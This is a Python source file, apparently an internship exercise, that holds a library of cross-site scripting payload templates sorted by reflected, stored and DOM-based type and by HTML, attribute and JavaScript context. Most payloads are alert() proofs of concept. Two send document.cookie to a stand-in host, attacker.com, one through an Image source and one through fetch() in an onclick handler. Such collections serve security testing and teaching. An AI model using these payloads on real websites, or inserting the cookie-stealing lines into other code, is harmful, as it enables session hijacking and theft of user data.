#!/usr/bin/env python3
"""
XSS Payloads - Templates only
Contains all XSS payload templates organized by type and context
ITSOLERA Internship Task - Educational Purpose Only
"""

from typing import List, Dict
from enum import Enum

class ContextType(Enum):
    """XSS context types for payload generation"""
    HTML = "html"
    ATTRIBUTE = "attribute"
    JAVASCRIPT = "javascript"

class XSSPayloads:
    """Repository of XSS payload templates"""
    
    def get_reflected(self, context: ContextType) -> List[Dict]:
        """Get reflected XSS payload templates for specific context"""
        
        # HTML Context Payloads
        if context == ContextType.HTML:
            return [
                {
                    "payload": "<script>alert('XSS')</script>",
                    "description": "Basic script tag injection",
                    "bypass_techniques": ["encoding", "tag_switching"]
                },
                {
                    "payload": "<img src=x onerror=alert('XSS')>",
                    "description": "Image tag with onerror event",
                    "bypass_techniques": ["event_handlers", "tag_switching"]
                },
                {
                    "payload": "<svg onload=alert('XSS')>",
                    "description": "SVG tag with onload event",
                    "bypass_techniques": ["alternative_tags"]
                },
                {
                    "payload": "<body onload=alert('XSS')>",
                    "description": "Body tag with onload event",
                    "bypass_techniques": ["events"]
                },
                {
                    "payload": "<iframe src=\"javascript:alert('XSS')\">",
                    "description": "Iframe with javascript URI",
                    "bypass_techniques": ["iframe", "protocol_abuse"]
                }
            ]
        
        # Attribute Context Payloads
        elif context == ContextType.ATTRIBUTE:
            return [
                {
                    "payload": "\" onmouseover=\"alert('XSS')\"",
                    "description": "Breaking attribute with event handler",
                    "bypass_techniques": ["quote_breaking", "event_handlers"]
                },
                {
                    "payload": "javascript:alert('XSS')",
                    "description": "JavaScript pseudo-protocol in href/src",
                    "bypass_techniques": ["protocol_abuse"]
                },
                {
                    "payload": "\" autofocus onfocus=\"alert('XSS')\"",
                    "description": "Autofocus with onfocus event",
                    "bypass_techniques": ["event_handlers"]
                },
                {
                    "payload": "\" onload=\"alert('XSS')\"",
                    "description": "Onload event in attribute",
                    "bypass_techniques": ["events"]
                }
            ]
        
        # JavaScript Context Payloads
        elif context == ContextType.JAVASCRIPT:
            return [
                {
                    "payload": "';alert('XSS');//",
                    "description": "Breaking JavaScript string context",
                    "bypass_techniques": ["string_breaking", "comment_insertion"]
                },
                {
                    "payload": "</script><script>alert('XSS')</script>",
                    "description": "Closing script tag to inject new script",
                    "bypass_techniques": ["tag_closure"]
                },
                {
                    "payload": "\\'alert(1)//",
                    "description": "Escaped quote bypass",
                    "bypass_techniques": ["escape_sequences"]
                },
                {
                    "payload": "alert(document.cookie)",
                    "description": "Direct JavaScript execution",
                    "bypass_techniques": ["function_call"]
                }
            ]
        
        return []
    
    def get_stored(self, context: ContextType) -> List[Dict]:
        """Get stored XSS payload templates"""
        # Start with reflected payloads
        payloads = self.get_reflected(context)
        
        # Add storage-specific metadata
        for payload in payloads:
            payload["storage_medium"] = ["database", "file", "cache", "logs"]
            payload["trigger_condition"] = "data_retrieval"
            payload["persistence"] = True
        
        return payloads
    
    def get_dom_based(self, context: ContextType) -> List[Dict]:
        """Get DOM-based XSS payload templates"""
        
        if context == ContextType.HTML:
            return [
                {
                    "payload": "#<script>alert('XSS')</script>",
                    "description": "URL fragment injection",
                    "source": "window.location.hash",
                    "sink": "innerHTML",
                    "bypass_techniques": ["fragment_abuse"]
                },
                {
                    "payload": "?param=<img src=x onerror=alert('XSS')>",
                    "description": "URL parameter injection",
                    "source": "document.URL",
                    "sink": "document.write",
                    "bypass_techniques": ["parameter_pollution"]
                },
                {
                    "payload": "#<img src=x onerror=alert('XSS')>",
                    "description": "Fragment with image tag",
                    "source": "location.hash",
                    "sink": "innerHTML",
                    "bypass_techniques": ["fragment_abuse"]
                },
                {
                    "payload": "javascript:alert('XSS')",
                    "description": "javascript: URI in DOM",
                    "source": "window.location",
                    "sink": "navigation",
                    "bypass_techniques": ["protocol_abuse"]
                }
            ]
        
        elif context == ContextType.JAVASCRIPT:
            return [
                {
                    "payload": "\\'-alert(1)//",
                    "description": "JavaScript execution via eval()",
                    "source": "location.search",
                    "sink": "eval()",
                    "bypass_techniques": ["eval_abuse"]
                },
                {
                    "payload": "new Image().src='http://attacker.com/?c='+document.cookie",
                    "description": "Cookie stealing via Image object",
                    "source": "document.cookie",
                    "sink": "Image().src",
                    "bypass_techniques": ["object_abuse"]
                },
                {
                    "payload": "setTimeout(\"alert('XSS')\", 100)",
                    "description": "setTimeout with string payload",
                    "source": "user_input",
                    "sink": "setTimeout",
                    "bypass_techniques": ["function_abuse"]
                }
            ]
        
        elif context == ContextType.ATTRIBUTE:
            return [
                {
                    "payload": "\" onload=\"alert(document.cookie)\"",
                    "description": "DOM-based via attribute injection",
                    "source": "document.cookie",
                    "sink": "attribute",
                    "bypass_techniques": ["attribute_injection"]
                },
                {
                    "payload": "\" onclick=\"fetch('https://attacker.com?c='+document.cookie)\"",
                    "description": "Data exfiltration via fetch",
                    "source": "document.cookie",
                    "sink": "fetch API",
                    "bypass_techniques": ["exfiltration"]
                }
            ]
        
        return []
